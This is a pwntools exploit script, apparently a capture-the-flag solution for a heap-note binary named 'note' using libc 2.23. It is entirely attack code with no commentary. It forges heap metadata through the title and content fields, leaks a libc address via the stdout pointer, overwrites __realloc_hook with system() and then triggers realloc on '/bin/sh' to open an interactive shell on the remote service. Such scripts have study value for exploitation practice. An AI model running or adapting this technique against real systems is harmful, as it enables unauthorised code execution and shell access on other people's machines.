#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./note"
ENV = {"LD_PRELOAD":"./libc-2.23.so"}

system_off = 0x45390
stdout_off = 0x3c48e0
realloc_hook_off = 0x3c4b08 

p = remote("localhost", 1234)
#p = remote("172.22.224.113", 1234)

def change_title(s):
    p.recvuntil("option--->>\n")
    p.sendline("1")
    p.recvuntil("enter the title:")
    p.send(s)

def change_content(size, s):
    p.recvuntil("option--->>\n")
    p.sendline("2")
    p.recvuntil("Enter the content size(64-256):")
    p.sendline(str(size))
    p.recvuntil("Enter the content:")
    p.send(s)

def change_comment(s):
    p.recvuntil("option--->>\n")
    p.sendline("3")
    p.recvuntil("Enter the comment:")
    p.send(s)

def show():
    p.recvuntil("option--->>\n")
    p.sendline("4")

def quit():
    p.recvuntil("option--->>\n")
    p.sendline("5")


#system_addr = libc_base+system_off
#realloc_hook_addr = libc_base+realloc_hook_off
#one_gadget_addr = libc_base+one_gadget_off

payload = p8(0)*0x8
payload += p64(0x20)
payload += p64(0x602058)
payload += p64(0x602060)
payload += p64(0x20)
change_title(payload+"@")

payload = p8(0)*0x38
payload += p64(0x41)
payload += "\n"
change_content(0x78, payload)

change_content(0x50, "\n")
change_content(0x20000, "\n")

payload = p64(0x602050)
payload += p64(0x602030)
payload += p64(0x8)
change_title(payload+"\n")

show()

p.recvuntil("The content is:")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-stdout_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
realloc_hook_addr = libc_base+realloc_hook_off

payload = p8(0)*0x8
payload += p64(realloc_hook_addr)
payload += p64(0x602070)
payload += p64(0x8)
payload += "/bin/sh\x00"
payload += p8(0)*0x10
change_comment(payload+"\n")

change_comment(p64(system_addr)+"\n")

p.recvuntil("option--->>\n")
p.sendline("2")
p.recvuntil("Enter the content size(64-256):")
p.sendline(str(0x100))

p.interactive()
